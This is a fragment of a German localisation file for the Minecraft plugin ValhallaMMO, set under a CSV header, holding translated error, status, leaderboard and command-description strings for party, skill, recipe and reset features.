id,title,username,language,date,content
    ""error_command_invalid_effect"": ""&cUngültiger Tränkeneffekttyp"",
    ""error_command_invalid_modifier"": ""&cUngültiger Modifikator"",
    ""error_command_modifier_failed"": ""&cDieser Gegenstand &7(%item%)&c ist mit diesem Modifikator &7(ausgeführt bei %player%) inkompatibel"",
    ""error_command_vanilla_effects_illegal"": ""&cVanille-Effekte können mit diesem Befehl nicht angewendet werden"",
    ""error_command_item_required"": ""&cEs muss ein Gegenstand gehalten werden!"",
    ""error_command_invalid_reward"": ""&cUngültige Belohnung"",
    ""error_command_invalid_argument_type"": ""&cUngültiger Argumenttyp, erwartet wurde %type%, erhalten wurde %arg%"",
    ""error_command_global_buff_expired"": ""&cDieser Effekt existiert entweder nicht oder ist bereits abgelaufen"",
    ""error_command_player_required"": ""&cSpieler-Name erforderlich"",
    ""error_command_import_file_not_found"": ""&cDatei nicht gefunden oder leer"",
    ""error_command_import_no_path_given"": ""&cKein Dateiname angegeben"",
    ""error_command_resourcepack"": ""&cBei der Beschaffung des Ressourcenpakets ist etwas schiefgelaufen"",
    ""error_command_item_id_not_found"": ""&cGegenstand mit dieser ID nicht gefunden"",
    ""error_command_advanced_modifier_unusable"": ""&cErweiterte Gegenstandsmodifikatoren können im Befehlsformat nicht verwendet werden. Entschuldigung!"",
    ""error_command_invalid_leaderboard"": ""&cUngültige Bestenliste!"",
    ""status_command_global_buff_removed"": ""&aGlobaler Effekt entfernt!"",
    ""status_command_global_buff_applied"": ""&aGlobaler Effekt %effect% für %duration_timestamp% angewendet!"",
    ""status_command_global_buff_warning"": ""&aGlobaler Effekt namens %effect% angewendet, aber er könnte nichts bewirken, da er nicht registriert wurde!"",
    ""status_command_modify_executed"": ""&aModifikator bei %count% Spielern ausgeführt"",
    ""status_command_reward_executed"": ""&aBelohnung ausgeführt"",
    ""status_command_hardness_set"": ""&aDie Härte von %block% wurde auf %hardness% gesetzt!"",
    ""status_command_hardness_removed"": ""&aDie Härte von %block% wurde entfernt, jetzt Standard!"",
    ""status_command_reload_executed"": ""&aPlugin-Konfigurationen neu geladen"",
    ""status_command_soft_reset_success"": ""&aFortschritt zurückgesetzt und zurückgewonnene Erfahrung erneut vergeben!"",
    ""status_command_hard_reset_success"": ""&aRücksetzung bestätigt!"",
    ""status_command_durable_effect_applied"": ""&a%effect% verliehen!"",
    ""status_command_instant_effect_applied"": ""&a%effect% %amplifier% verliehen!"",
    ""status_command_exp_success"": ""&a%player% wurden %amount% %skill% Erfahrung gegeben"",
    ""status_command_saveall_done"": ""&aAlles gespeichert!"",
    ""status_command_levels_redeemed"": ""&a%amount% %skill% Level eingelöst!"",
    ""status_command_exp_redeemed"": ""&a%amount% %skill% Erfahrung eingelöst!"",
    ""status_profiles_loaded"": ""&aDeine Statistiken sind geladen"",
    ""status_crafting_recipe_selected"": ""&7Crafting-Rezept &a%recipe%&7 ausgewählt."",
    ""status_tinkering_recipe_selected"": ""&7Bearbeitungsmethode &a%recipe%&7 ausgewählt."",
    ""status_onetime_crafting_recipe_selected"": ""&7Crafting-Rezept &a%recipe%&7 ausgewählt. Halte Rechtsklick auf den Block, um zu craften!"",
    ""status_onetime_tinkering_recipe_selected"": ""&7Bearbeitungsmethode &a%recipe%&7 ausgewählt. Halte Rechtsklick auf den Block mit &a%item% &7zum Bearbeiten!"",
    ""status_command_import_success"": ""&aRezepte importiert!"",
    ""status_command_resourcepack_downloaded"": ""&aResourcenpaket erfolgreich heruntergeladen! Dateiort plugins/ValhallaMMO/ValhallaMMO_pack.zip"",
    ""status_command_resourcepack_setup"": ""&aResourcenpaket erfolgreich heruntergeladen und installiert! Server neustarten, um Änderungen zu übernehmen"",
    ""status_command_resourcepack_enabled"": ""&aStandard-Ressourcenpaket-Konfiguration aktiviert"",
    ""status_command_resourcepack_disabled"": ""&7Standard-Ressourcenpaket-Konfiguration deaktiviert"",
    ""status_command_item_indexed"": ""&aGegenstand indiziert! ID ist &2%id%"",
    ""status_command_item_removed"": ""&aGegenstand entfernt!"",
    ""status_command_bossbars_hidden"": ""&7Erfahrungsbalken sind jetzt ausgeblendet"",
    ""status_command_bossbars_shown"": ""&7Erfahrungsbalken sind jetzt sichtbar"",
    ""status_command_revealrecipes_enabled"": ""&aDie Namen der gecrafteten Rezepte werden Ihnen jetzt angezeigt"",
    ""status_command_revealrecipes_disabled"": ""&cDie Namen der gecrafteten Rezepte sind Ihnen jetzt verborgen"",
    ""status_command_party_chat_enabled"": ""&aParty-Chat aktiviert"",
    ""status_command_party_chat_disabled"": ""&7Party-Chat deaktiviert"",
    ""status_command_party_created"": ""&aParty erstellt!"",
    ""status_command_party_created_by_admin"": ""&aEine Party mit dem Namen &2%party% &awurde in deinem Namen erstellt"",
    ""status_command_party_invalid_rank"": ""&cRang existiert nicht!"",
    ""status_command_party_member_not_inviteable"": ""&cSpieler kann nicht eingeladen werden"",
    ""status_command_party_forbidden_region"": ""&cNicht erlaubt hier!"",
    ""status_command_party_target_no_party"": ""&cZiel ist in keiner Party"",
    ""status_command_party_sender_no_party"": ""&cDu bist in keiner Party"",
    ""status_command_party_target_higher_rank"": ""&cDu kannst das einem Mitglied mit höherem Rang nicht antun"",
    ""status_command_party_rank_higher_sender"": ""&cDu kannst das mit Rängen nicht tun, die höher oder gleich deinem eigenen sind"",
    ""status_command_party_rank_not_found"": ""&cDieser Rang existiert nicht"",
    ""status_command_party_target_sender_same"": ""&cDu kannst das nicht dir selbst antun"",
    ""status_command_party_sender_not_leader"": ""&cDu musst Anführer der Party sein, um das zu tun"",
    ""status_command_party_sender_no_rank"": ""&cDu hast keinen Rang"",
    ""status_command_party_not_in_same_party"": ""&cDu bist nicht in derselben Party wie dieser Spieler"",
    ""status_command_party_already_in_party"": ""&cDu bist bereits in einer Party"",
    ""status_command_party_not_in_party"": ""&cDu bist in keiner Party"",
    ""status_command_party_party_not_found"": ""&cDie Party konnte nicht gefunden oder wurde gelöscht"",
    ""status_command_party_invalid_stat"": ""&cEs gibt keinen Statistiktyp mit diesem Namen, gültige Statistiken sind %stats%"",
    ""status_command_party_invalid_company_stat"": ""&cEs gibt keine Statistik mit diesem Namen"",
    ""status_command_party_exp_granted"": ""&aErfahrung verliehen!"",
    ""status_command_party_exp_removed"": ""&aErfahrung entfernt!"",
    ""status_command_party_invalid_boolean"": ""&cErwartet true/false/default, aber erhalten %arg%"",
    ""status_command_party_invalid_number"": ""&cErwartet eine Zahl, aber erhalten %arg%"",
    ""status_command_party_party_already_exists"": ""&cParty mit diesem Namen existiert bereits"",
    ""status_command_party_feature_not_unlocked"": ""&cDeine Party hat diese Funktion entweder nicht freigeschaltet oder sie ist deaktiviert"",
    ""status_command_party_cannot_kick_leader"": ""&cDer Anführer kann die Party nicht verlassen, bevor er die Führung überträgt"",
    ""status_command_party_on_cooldown"": ""&cDiese Fähigkeit befindet sich gerade auf Abklingzeit"",
    ""status_command_party_no_item_held"": ""&cDu musst ein Gegenstand halten für Gegenstandstausch"",
    ""status_command_party_character_limit_reached"": ""&cSchriftzeichenlimit überschritten, denk an einen kürzeren Namen/eine kürzere Beschreibung"",
    ""status_command_party_name_not_long_enough"": ""&cName nicht lang genug"",
    ""status_command_party_invalid_characters_used"": ""&cUnzulässige Zeichen verwendet, gültige Zeichen sind: 0-9, a-z, A-Z, &"",
    ""status_command_party_not_invited"": ""&cDu bist nicht zu dieser Party eingeladen >:("",
    ""status_command_party_open"": ""&aParty ist jetzt für jeden offen"",
    ""status_command_party_closed"": ""&7Party ist jetzt für Beitritt geschlossen"",
    ""status_command_party_exp_sharing_enabled"": ""&aParty-Erfahrungsteilung aktiviert"",
    ""status_command_party_exp_sharing_disabled"": ""&7Party-Erfahrungsteilung deaktiviert"",
    ""status_command_party_item_sharing_enabled"": ""&aParty-Gegenstandsteilung aktiviert"",
    ""status_command_party_item_sharing_disabled"": ""&7Party-Gegenstandsteilung deaktiviert"",
    ""status_command_party_friendly_fire_enabled"": ""&aFreundliches Feuer aktiviert"",
    ""status_command_party_friendly_fire_disabled"": ""&aFreundliches Feuer deaktiviert"",
    ""status_command_party_invite_sent"": ""&aEinladung gesendet"",
    ""status_command_party_invite_received"": ""&a%player% hat dich eingeladen %party% beizutreten! Tippe &2/party join %party_id% &aum beizutreten"",
    ""status_command_party_player_kicked"": ""&aSpieler gekickt"",
    ""status_command_party_leadership_transferred"": ""&aFührung übertragen"",
    ""status_command_party_rank_changed"": ""&aRang gesetzt"",
    ""status_command_party_joined"": ""&aParty beigetreten!"",
    ""status_command_party_left"": ""&aParty verlassen"",
    ""status_command_party_item_shared"": ""&aGegenstand geteilt"",
    ""status_command_party_disband_confirmation"": ""&cDies kann nicht rückgängig gemacht werden und der gesamte Fortschritt der Party geht verloren, bist du sicher? &4/party disband confirm"",
    ""status_command_party_disband_confirm_confirmation"": ""&cErnsthaft??? &4/party disband really"",
    ""status_command_party_disbanded"": ""&cParty aufgelöst"",
    ""status_command_party_invites_muted"": ""&aParty-Einladungen stumm"",
    ""status_command_party_invites_unmuted"": ""&aParty-Einladungen sichtbar"",
    ""status_command_party_item_received"": ""&a%player% hat dir %amount%x %item% gesendet!"",
    ""status_command_party_member_cap_reached"": ""&cMitgliederbegrenzung erreicht"",
    ""status_command_party_member_joined"": ""&a%player% ist der Party beigetreten!"",
    ""status_command_party_member_kicked"": ""&cDu wurdest aus der Party entfernt"",
    ""status_command_party_description_updated"": ""&aBeschreibung geändert"",
    ""status_command_party_name_updated"": ""&aName geändert"",
    ""status_command_party_stats_updated"": ""&aStatistiken aktualisiert!"",
    ""status_command_party_spy_enabled"": ""&aParty-Überwachung &2aktiviert"",
    ""status_command_party_spy_disabled"": ""&aParty-Überwachung &2deaktiviert"",
    ""status_command_item_share_outranged"": ""&c%player% ist zu weit entfernt!"",
    ""status_command_parties_disabled"": ""&cParties sind auf diesem Server deaktiviert!"",
    ""leaderboard_power_level"": ""&#ff5640Macht-Level &7(S.%page%)"",
    ""leaderboard_smithing_level"": ""&eSchmieden-Level &7(S.%page%)"",
    ""leaderboard_alchemy_level"": ""&dAlchemie-Level &7(S.%page%)"",
    ""leaderboard_enchanting_level"": ""&bVerzaubern-Level &7(S.%page%)"",
    ""leaderboard_mining_level"": ""&cAbbauen-Level &7(S.%page%)"",
    ""leaderboard_fishing_level"": ""&9Fischen-Level &7(S.%page%)"",
  ""leaderboard_woodcutting_level"": ""&2Holzfällen-Level &7(S.%page%)"",
  ""leaderboard_digging_level"": ""&#753713Graben-Level &7(S.%page%)"",
  ""leaderboard_archery_level"": ""&#00ffaaBogenschießen-Level &7(S.%page%)"",
  ""leaderboard_light_weapons_level"": ""&#ffac40Leichte Waffen-Level &7(S.%page%)"",
  ""leaderboard_heavy_weapons_level"": ""&#ff7640Schwere Waffen-Level &7(S.%page%)"",
  ""leaderboard_light_armor_level"": ""&#ffac40Leichte Rüstung-Level &7(S.%page%)"",
  ""leaderboard_heavy_armor_level"": ""&#ff7640Schwere Rüstung-Level &7(S.%page%)"",
  ""leaderboard_personal_prefix"": ""&7>>> "",
  ""leaderboard_unranked"": ""&7%player% ist noch nicht auf der Bestenliste! "",
  ""perk_forget"": ""&cDu hast %perk% vergessen"",
  ""warning_command_reload"": ""&cVorsicht! Änderungen an Rezepten und Loot-Tabellen werden vor dem Neustart gespeichert und führen zu einem Leistungsabfall. Geben Sie &4/val reload confirm&c ein, um den Neustart wirklich durchzuführen"",
  ""warning_profile_reset"": ""&cWarte! Dieser Reset kann nicht rückgängig gemacht werden und setzt den Fortschritt des Spielers komplett zurück. Führen Sie diesen Befehl erneut aus, um zurückzusetzen, andernfalls läuft die Anfrage in 10 Sekunden ab."",
  ""warning_command_import"": ""&cWarte! Das Importieren von Rezepten kann zu Leistungseinbußen führen, führen Sie diesen Befehl innerhalb von 10 Sekunden erneut aus, um fortzufahren."",
  ""warning_profiles_unloaded"": ""&cDeine Statistiken sind noch nicht geladen"",
  ""warning_item_too_advanced"": ""&cDein &7%item% &cist zu fortgeschritten für dich, bis &7%skill% &cLevel &7%level%"",
  ""description_command_skills"": ""Greift auf den Fertigkeitenbaum des Spielers zu"",
  ""description_command_help"": ""Zeigt eine Liste aller verfügbaren Befehle"",
  ""description_command_recipes"": ""Greift auf den benutzerdefinierten Rezeptmanager von ValhallaMMO zu"",
  ""description_command_reset"": ""Setzt den Fortschritt eines Spielers komplett zurück"",
  ""description_command_profile"": ""Zeigt detaillierte Statistiken zum Fertigkeitenniveau eines Spielers an"",
  ""description_command_exp"": ""Gewährt dir oder einem Spieler eine bestimmte Menge an Fertigkeitenerfahrung"",
  ""description_command_modify"": ""Modifiziert ein gehaltenes Item mit einem Modifikator und einer Stärke"",
  ""description_command_attribute"": ""Wendet ein Attribut auf ein gehaltenes Item an"",
  ""description_command_effect"": ""Gewährt einem Spieler jegliche benutzerdefinierte Tränkewirkung"",
  ""description_command_potionattribute"": ""Wendet eine benutzerdefinierte Tränkewirkung auf das gehaltene Item an"",
  ""description_command_reward"": ""Führt eine Perk-Belohnung mit dem angegebenen Argument auf einen Spieler aus"",
  ""description_command_loot"": ""Greift auf den benutzerdefinierten Loot-Tabellenmanager von ValhallaMMO zu"",
